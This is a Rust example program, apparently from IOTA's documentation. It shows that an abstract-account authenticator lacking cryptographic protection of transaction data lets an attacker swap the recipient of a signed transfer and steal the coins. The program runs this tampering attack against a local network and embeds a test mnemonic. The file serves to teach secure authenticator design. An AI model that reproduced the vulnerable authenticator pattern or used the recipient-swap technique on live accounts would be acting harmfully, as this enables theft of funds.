// Copyright (c) 2026 IOTA Stiftung
// SPDX-License-Identifier: Apache-2.0

//! Example demonstrating the vulnerability if transaction data cryptographic
//! protection is missed in an abstract account authenticator implementation.

use std::str::FromStr;

use anyhow::Result;
use docs_examples::utils::{
    create_transaction_data, execute_ptb, execute_transaction, get_coin, publish_aa_package,
    request_tokens_from_faucet,
};
use iota_keys::keystore::{AccountKeystore, InMemKeystore};
use iota_sdk::{
    IotaClient, IotaClientBuilder, rpc_types::ObjectChange, types::crypto::SignatureScheme::ED25519,
};
use iota_types::{
    base_types::{Identifier, IotaAddress, ObjectID, ObjectRef, TypeTag},
    object::Owner,
    programmable_transaction_builder::ProgrammableTransactionBuilder,
    signature::GenericSignature,
    transaction::{
        Argument, CallArg, SharedObjectRef, Transaction, TransactionData, TransactionKind,
    },
    utils::MoveAuthenticator,
};

/// Got from iota-genesis-builder/src/stardust/test_outputs/stardust_mix.rs
const MAIN_ADDRESS_MNEMONIC: &str = "okay pottery arch air egg very cave cash poem gown sorry mind poem crack dawn wet car pink extra crane hen bar boring salt";

/// Account example relative path.
const AA_PACKAGE_PATH: &str =
    "../move/abstract_account/authenticator-tx-data-cryptographic-protection";

/// Account module name.
const AA_MODULE_NAME: &str = "account";
/// Account struct name.
const AA_ACCOUNT_NAME: &str = "Account";
/// Account create function name.
const AA_CREATE_ACCOUNT_FN_NAME: &str = "create";
/// Account authenticator function name.
const AA_AUTHENTICATE_FN_NAME: &str = "authenticate";

/// IOTA authenticator function module name.
const IOTA_AUTHENTICATOR_FN_MODULE_NAME: &str = "authenticator_function";
/// IOTA create `AuthenticatorFunctionRefV1` function name.
const IOTA_CREATE_AUTH_FUNCTION_REF_V1_FN_NAME: &str = "create_auth_function_ref_v1";

#[tokio::main]
async fn main() -> Result<(), anyhow::Error> {
    // Build an iota client for a local network
    let iota_client = IotaClientBuilder::default().build_localnet().await?;

    // Setup the temporary in memory keystore
    let mut keystore = InMemKeystore::new_insecure_for_tests(0);

    // Derive the address of the first account and set it as default
    let publisher = keystore.import_from_mnemonic(MAIN_ADDRESS_MNEMONIC, ED25519, None, None)?;

    println!("Publisher address: {publisher}");

    // Top up the publisher address from the faucet
    request_tokens_from_faucet(&iota_client, publisher).await?;

    // Publish the account package and return the related package id and package
    // metadata reference
    let (package_id, metadata_ref) =
        publish_aa_package(&iota_client, &mut keystore, publisher, AA_PACKAGE_PATH).await?;

    // Create an abstract account instance with `unlock_time` equals to `0` that
    // means no lock
    let account_ref = create_account(
        &iota_client,
        &mut keystore,
        publisher,
        &package_id,
        metadata_ref,
        0,
    )
    .await?;
    let account_address = account_ref.object_id.into();

    // Top up the account address from the faucet
    request_tokens_from_faucet(&iota_client, account_address).await?;

    // Create an abstract account transaction
    let recipient = IotaAddress::random();

    println!("Recipient address: {recipient}");

    let transaction = create_test_transaction(&iota_client, recipient, &account_ref).await?;

    // Execute the transaction
    let _ = execute_transaction(&iota_client, transaction).await?;

    // Get a transferred coin from the recipient address to verify the
    // transaction succeeded
    let recipient_coin = get_coin(&iota_client, recipient).await?;
    println!("Recipient coin: {recipient_coin:?}");

    // Create one more test transaction
    let transaction = create_test_transaction(&iota_client, recipient, &account_ref).await?;

    // Swap the recipient in the transaction to an attacker-controlled address
    let attacker = IotaAddress::random();

    println!("Attacker address: {attacker}");

    let hacked_transaction = swap_recipient_in_transaction(transaction, attacker);

    // Execute the hacked transaction.
    // Due to the missing cryptographic protection in the authenticator
    // implementation, the transaction will be accepted and executed successfully.
    let _ = execute_transaction(&iota_client, hacked_transaction).await?;

    // Get a transferred coin from the attacker address to verify the
    // transaction succeeded.
    let attacker_coin = get_coin(&iota_client, attacker).await?;
    println!("Attacker coin: {attacker_coin:?}");

    Ok(())
}

/// Creates an abstract account instance.
pub async fn create_account(
    iota_client: &IotaClient,
    keystore: &mut InMemKeystore,
    publisher: IotaAddress,
    package_id: &ObjectID,
    package_metadata_ref: ObjectRef,
    unlock_time: u64,
) -> Result<ObjectRef> {
    // Create a PTB that creates an abstract account
    let pt = {
        let mut builder = ProgrammableTransactionBuilder::new();

        let arguments = vec![
            builder.obj(CallArg::ImmutableOrOwned(package_metadata_ref))?,
            builder.pure(AA_MODULE_NAME)?,
            builder.pure(AA_AUTHENTICATE_FN_NAME)?,
        ];
        if let Argument::Result(authenticator_function_ref_v1) = builder.programmable_move_call(
            ObjectID::FRAMEWORK,
            Identifier::from_static(IOTA_AUTHENTICATOR_FN_MODULE_NAME),
            Identifier::from_static(IOTA_CREATE_AUTH_FUNCTION_REF_V1_FN_NAME),
            vec![aa_type_tag(package_id)],
            arguments,
        ) {
            let arguments = vec![
                builder.pure(unlock_time)?,
                Argument::Result(authenticator_function_ref_v1),
            ];
            builder.programmable_move_call(
                *package_id,
                Identifier::from_static(AA_MODULE_NAME),
                Identifier::from_static(AA_CREATE_ACCOUNT_FN_NAME),
                vec![],
                arguments,
            );
        }

        builder.finish()
    };

    // Execute the transaction
    let transaction_response = execute_ptb(iota_client, keystore, publisher, pt).await?;

    println!(
        "Account creating transaction digest: {}",
        transaction_response.digest
    );

    let account_ref = transaction_response
        .object_changes
        .as_ref()
        .and_then(|changes| {
            changes
                .iter()
                .find(|change| match change {
                    ObjectChange::Created { owner, .. } => {
                        matches!(owner, Owner::Shared { .. })
                    }
                    _ => false,
                })
                .map(|change| change.object_ref())
        })
        .expect("Account ref must be found");

    println!("Account Ref: {account_ref:?}");

    Ok(account_ref)
}

/// Creates a test transaction from the abstract account.
pub async fn create_test_transaction(
    iota_client: &IotaClient,
    recipient: IotaAddress,
    account_ref: &ObjectRef,
) -> Result<Transaction> {
    let account_address = account_ref.object_id.into();

    // Create a PTB that sends some IOTA from the abstract account to the recipient
    let pt = {
        let mut builder = ProgrammableTransactionBuilder::new();

        builder.transfer_iota(recipient, Some(10));
        builder.finish()
    };

    let tx_data = create_transaction_data(iota_client, account_address, pt).await?;

    // Create a transaction
    let account_call_arg = CallArg::Shared(SharedObjectRef::new(
        account_ref.object_id,
        account_ref.version,
        false,
    ));

    let signature = GenericSignature::MoveAuthenticator(MoveAuthenticator::new_v1(
        vec![],
        vec![],
        account_call_arg,
    ));

    Ok(Transaction::from_generic_sig_data(tx_data, vec![signature]))
}

/// Swaps the recipient in the transaction to an attacker-controlled address.
pub fn swap_recipient_in_transaction(
    mut transaction: Transaction,
    attacker: IotaAddress,
) -> Transaction {
    match &mut transaction.inner_mut().intent_message.value {
        TransactionData::V1(data) => match &mut data.kind {
            TransactionKind::Programmable(ptb) => {
                ptb.inputs[0] = CallArg::Pure(bcs::to_bytes(&attacker).unwrap());
            }
            _ => panic!("Expected a programmable transaction"),
        },
        _ => panic!("Expected a V1 transaction"),
    }

    transaction
}

/// Utility function to get the TypeTag of the abstract account struct.
fn aa_type_tag(package_id: &ObjectID) -> TypeTag {
    TypeTag::from_str(format!("{package_id}::{AA_MODULE_NAME}::{AA_ACCOUNT_NAME}").as_str())
        .unwrap()
}
